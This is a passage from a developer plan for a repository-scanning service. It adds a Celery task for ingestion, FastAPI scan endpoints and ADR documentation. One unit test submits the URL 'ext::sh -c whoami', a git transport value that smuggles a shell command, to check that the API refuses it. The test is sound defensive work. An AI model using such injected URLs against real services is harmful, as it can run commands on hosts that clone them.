    with pytest.raises(ValueError):
        tasks.run_scan("not-a-uuid")
```

- [ ] **Step 2: Run it and watch it fail**

Run: `.venv/Scripts/python -m pytest tests/unit/test_tasks.py -v`
Expected: FAIL — no module `app.workers.tasks`.

- [ ] **Step 3: Let `build_engine` take a pool class**

In `app/db.py`, change `build_engine`:

```python
def build_engine(settings: Settings, *, poolclass: type[Pool] | None = None) -> AsyncEngine:
    """Create an engine for the given settings.

    Takes settings explicitly rather than reading globals so tests and Alembic can build
    an engine against a different database without mutating process state.

    ``poolclass`` exists for the Celery worker, which runs each task under its own
    ``asyncio.run``. A pooled asyncpg connection created in one event loop and reused in
    another raises "attached to a different loop", so the worker passes ``NullPool``.
    """
    kwargs: dict[str, Any] = {"echo": settings.db_echo, "pool_pre_ping": True}
    if poolclass is None:
        kwargs |= {"pool_size": settings.db_pool_size, "max_overflow": settings.db_max_overflow}
    else:
        kwargs["poolclass"] = poolclass
    return create_async_engine(str(settings.database_url), **kwargs)
```

Import `Any` from `typing` and `Pool` from `sqlalchemy.pool`. `pool_size` and `max_overflow` are not valid for `NullPool`, which is why they move into the branch.

- [ ] **Step 4: Implement the task**

Create `app/workers/tasks.py`:

```python
"""Celery tasks.

Celery tasks are synchronous and the data layer is asyncio throughout, so each task owns
an event loop for its own duration via ``asyncio.run``. The alternative -- a second,
synchronous driver for workers -- would mean every query could be written two ways and
the two kept in step forever. See ADR 0012.

The engine is built per task with NullPool because a pooled asyncpg connection created in
one loop and reused in another raises "attached to a different loop". tests/conftest.py
already carries this lesson for the same reason.
"""

from __future__ import annotations

import asyncio
import uuid

import structlog
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy.pool import NullPool

from app.config import get_settings
from app.db import build_engine
from app.services.ingestion.pipeline import run_ingestion
from app.workers.celery_app import celery_app

logger = structlog.get_logger(__name__)


@celery_app.task(name="codesentinel.run_scan")
def run_scan(scan_id: str) -> None:
    """Ingest the repository for one scan.

    The id is parsed before any work starts: a malformed id is a programming error in the
    dispatcher, and failing immediately is better than a half-run scan.
    """
    parsed = uuid.UUID(scan_id)
    structlog.contextvars.bind_contextvars(scan_id=scan_id)
    try:
        asyncio.run(_run_scan(parsed))
    finally:
        structlog.contextvars.unbind_contextvars("scan_id")


async def _run_scan(scan_id: uuid.UUID) -> None:
    """The async body, with an engine scoped to this task's loop."""
    settings = get_settings()
    engine = build_engine(settings, poolclass=NullPool)
    try:
        async with AsyncSession(engine, expire_on_commit=False) as session:
            await run_ingestion(session, scan_id, settings=settings)
    finally:
        await engine.dispose()
```

In `app/workers/celery_app.py`, register the task module so a worker discovers it — add `app.conf.update(imports=("app.workers.tasks",))` inside `create_celery_app`, and update the module docstring, which currently says the pipeline tasks "arrive in phase 3".

- [ ] **Step 5: Run the tests**

Run: `.venv/Scripts/python -m pytest tests/unit/test_tasks.py tests/unit/test_config.py -v`
Expected: PASS.

- [ ] **Step 6: Commit**

```bash
git add backend/app/db.py backend/app/workers/ backend/tests/unit/test_tasks.py
git commit -m "feat(workers): dispatch ingestion from a celery task"
```

Body: record why `NullPool` is required rather than preferred, and why a second synchronous driver was rejected.

---

### Task 10: The scans API

**Files:**
- Create: `backend/app/schemas/scan.py`, `backend/app/api/v1/scans.py`
- Modify: `backend/app/api/v1/__init__.py`
- Test: `backend/tests/unit/test_scans_api.py`, `backend/tests/integration/test_scans_api_integration.py`

**Interfaces:**
- Consumes: `validate_repository_url`, `repository_name_from_url` (Task 2); `run_scan` (Task 9).
- Produces: `POST /api/v1/scans`, `GET /api/v1/scans/{scan_id}`.

- [ ] **Step 1: Write the failing test**

```python
"""The scans API. No database and no broker -- both are stubbed."""

from __future__ import annotations

import pytest
from httpx import AsyncClient


async def test_an_invalid_url_is_refused_synchronously(client: AsyncClient) -> None:
    """A caller should not have to poll a FAILED scan to learn their URL was unusable."""
    response = await client.post("/api/v1/scans", json={"url": "ext::sh -c whoami"})
    assert response.status_code == 422
    assert "transport" in response.text.lower()


async def test_a_missing_url_is_a_validation_error(client: AsyncClient) -> None:
    response = await client.post("/api/v1/scans", json={})
    assert response.status_code == 422
```

- [ ] **Step 2: Run it and watch it fail**

Run: `.venv/Scripts/python -m pytest tests/unit/test_scans_api.py -v`
Expected: FAIL — 404, the route does not exist.

- [ ] **Step 3: Write the schemas**

Create `app/schemas/scan.py`:

```python
"""Request and response models for the scans API."""

from __future__ import annotations

import uuid
from datetime import datetime

from pydantic import BaseModel, Field

from app.models.enums import ScanStatus


class ScanRequest(BaseModel):
    """A request to analyse a public repository."""

    url: str = Field(min_length=1, max_length=2048)


class ScanAccepted(BaseModel):
    """The response to a dispatched scan. Deliberately minimal: the scan has not run."""

    scan_id: uuid.UUID
    status: ScanStatus


class ScanDetail(BaseModel):
    """A scan's current state.

    ``error`` is populated for a FAILED scan and says why in terms the caller can act on.
    ``commit_sha`` is null until the clone resolves the ref.
    """

    scan_id: uuid.UUID
    status: ScanStatus
    commit_sha: str | None
    error: str | None
    file_count: int
    commit_count: int
    started_at: datetime
    completed_at: datetime | None
```

- [ ] **Step 4: Write the router**

Create `app/api/v1/scans.py`:

```python
"""Submitting and inspecting scans.

The URL is validated here rather than in the worker so an unusable URL is refused
synchronously, with a reason. Making the caller poll a FAILED scan to discover they had a
typo is a worse API for no benefit.
"""

from __future__ import annotations

import uuid

import structlog
from fastapi import APIRouter, HTTPException, status
from sqlalchemy import func, select
from sqlalchemy.ext.asyncio import AsyncSession

from app.api.deps import SessionDep, SettingsDep
from app.models.code import File
from app.models.enums import ScanStatus
from app.models.history import Commit
from app.models.repository import Repository, Scan
from app.schemas.scan import ScanAccepted, ScanDetail, ScanRequest
from app.services.ingestion.errors import UnsafeRepositoryUrlError
from app.services.ingestion.url import repository_name_from_url, validate_repository_url

logger = structlog.get_logger(__name__)

router = APIRouter(prefix="/scans", tags=["scans"])


@router.post("", response_model=ScanAccepted, status_code=status.HTTP_202_ACCEPTED)
async def submit_scan(
    request: ScanRequest, session: SessionDep, settings: SettingsDep
) -> ScanAccepted:
    """Accept a repository for analysis and dispatch the ingestion task."""
    try:
        url = validate_repository_url(request.url, settings=settings)
    except UnsafeRepositoryUrlError as exc:
        raise HTTPException(status.HTTP_422_UNPROCESSABLE_ENTITY, detail=str(exc)) from exc

    repository = (
        await session.execute(select(Repository).where(Repository.url == url))
    ).scalar_one_or_none()
    if repository is None:
        repository = Repository(url=url, name=repository_name_from_url(url))
        session.add(repository)
        await session.flush()

    scan = Scan(
        repository_id=repository.id,
        status=ScanStatus.PENDING,
        # The configuration that produced this result, captured at dispatch (C5).
        config=settings.reproducibility_snapshot(),
    )
    session.add(scan)
    await session.commit()

    # Imported here so the API does not require a broker to be importable.
    from app.workers.tasks import run_scan

    run_scan.delay(str(scan.id))
    logger.info("scan.dispatched", scan_id=str(scan.id), url=url)
    return ScanAccepted(scan_id=scan.id, status=scan.status)


@router.get("/{scan_id}", response_model=ScanDetail)
async def get_scan(scan_id: uuid.UUID, session: SessionDep) -> ScanDetail:
    """Current state of one scan."""
    scan = await session.get(Scan, scan_id)
    if scan is None:
        raise HTTPException(status.HTTP_404_NOT_FOUND, detail=f"No scan with id {scan_id}")

    file_count = await _count_files(session, scan.repository_id)
    commit_count = await _count_commits(session, scan.repository_id)

    return ScanDetail(
        scan_id=scan.id,
        status=scan.status,
        commit_sha=scan.commit_sha,
        error=scan.error,
        file_count=file_count,
        commit_count=commit_count,
        started_at=scan.started_at,
        completed_at=scan.completed_at,
    )


async def _count_files(session: AsyncSession, repository_id: uuid.UUID) -> int:
    """How many files were inventoried for this repository."""
    result = await session.execute(
        select(func.count()).select_from(File).where(File.repository_id == repository_id)
    )
    return int(result.scalar_one())


async def _count_commits(session: AsyncSession, repository_id: uuid.UUID) -> int:
    """How many commits were mined for this repository."""
    result = await session.execute(
        select(func.count()).select_from(Commit).where(Commit.repository_id == repository_id)
    )
    return int(result.scalar_one())
```

Create `app/api/deps.py` with the two annotated dependencies this imports:

```python
"""Shared FastAPI dependencies."""

from __future__ import annotations

from typing import Annotated

from fastapi import Depends
from sqlalchemy.ext.asyncio import AsyncSession

from app.config import Settings, get_settings
from app.db import get_session

SessionDep = Annotated[AsyncSession, Depends(get_session)]
SettingsDep = Annotated[Settings, Depends(get_settings)]
```

Register the router in `app/api/v1/__init__.py`:

```python
from app.api.v1 import scans

api_router = APIRouter()
api_router.include_router(scans.router)
```

and update that module's docstring, which currently says it is "Empty until phase 3".

- [ ] **Step 5: Run the tests and the full gate**

Run: `.venv/Scripts/python -m pytest tests/unit/test_scans_api.py -v`
Expected: PASS.

Run: `bash ../.claude/skills/codesentinel-development/scripts/gate.sh`
Expected: every step ok. Report skips as unverified, never as passing.

- [ ] **Step 6: Commit**

```bash
git add backend/app/api/ backend/app/schemas/scan.py backend/tests/unit/test_scans_api.py backend/tests/integration/test_scans_api_integration.py
git commit -m "feat(api): add the scans endpoints"
```

---

### Task 11: ADRs and the sprint record

**Files:**
- Create: `docs/adr/0011-host-clone-hardening.md`, `docs/adr/0012-worker-event-loop-per-task.md`, `docs/adr/0013-worker-docker-access.md`
- Modify: `docs/adr/README.md`, `README.md`, `docs/sprints/README.md`
- Create: `docs/sprints/phase-3-ingestion.md`

- [ ] **Step 1: Write ADR 0011**

`docs/adr/0011-host-clone-hardening.md`, following the house format (`# 0011. <sentence>`, `**Status:** accepted — <date>`, `## Context`, `## Decision`, `## Consequences`).

Context: C1 requires analysis inside the sandbox, and ADR 0009 gives that sandbox no network — so it cannot clone. The clone must therefore run on the host, against a hostile URL. Decision: the C1 boundary is *executing target code*, not reading its bytes; cloning and inventory run on the host under an unconditional hardening set (the table from the spec). Consequences: phases that want to parse target content on the host inherit this justification and its limit — anything that *runs* target tooling still belongs in the sandbox.

- [ ] **Step 2: Write ADR 0012**

The worker's event loop. Context: Celery is synchronous, the data layer is not. Decision: `asyncio.run` per task with a `NullPool` engine. Consequences: an engine per task; no second driver; the "attached to a different loop" failure is structurally impossible rather than avoided by convention.

- [ ] **Step 3: Write ADR 0013**

Resolves ADR 0006, which phase 2 left open. Context: phase 2 deferred the question of how a worker reaches the Docker daemon. Decision: phase 3 runs no containers, so the worker gets no daemon access at all; the mechanism is chosen now and implemented in phase 5 when analysers land. Set ADR 0006's status to `superseded by 0013` in its own file and in the README table.

- [ ] **Step 4: Update the indexes**

Add rows for 0011-0013 to the table in `docs/adr/README.md`. Update the **Status** section of the root `README.md`, which still says "Phase 1 (Foundation) — ... No analysers, sandbox, or ingestion yet."

- [ ] **Step 5: Write the sprint record**

`docs/sprints/phase-3-ingestion.md`, following `phase-2-sandbox.md`: scope delivered, an acceptance table citing the **CI run number** and pass/skip counts, defects CI caught, and obligations placed on later phases. Carry forward the two still open from phase 2 — `reap_orphans()` scoping before concurrent scans, and that phase 5 may not open the network. Link it from `docs/sprints/README.md`.

Do not write the acceptance table until CI has actually run. "It works locally" is not evidence for anything requiring a database.

- [ ] **Step 6: Commit**

```bash
git add docs/ README.md
git commit -m "docs: record phase 3 decisions and acceptance"
```

---

## Verification before calling phase 3 done

- [ ] `bash .claude/skills/codesentinel-development/scripts/gate.sh` passes locally, with skips reported as unverified.
- [ ] `CODESENTINEL_REQUIRE_INTEGRATION=1` locally converts the git and database skips into failures, confirming they are genuinely gated.
- [ ] CI is green, and the sprint record's acceptance table cites that run number with its pass/skip counts.
- [ ] `alembic upgrade head` then `downgrade -1` then `upgrade head` all succeed against real PostgreSQL.
- [ ] The three phase-3 ADRs exist and appear in `docs/adr/README.md`; ADR 0006 is marked superseded.
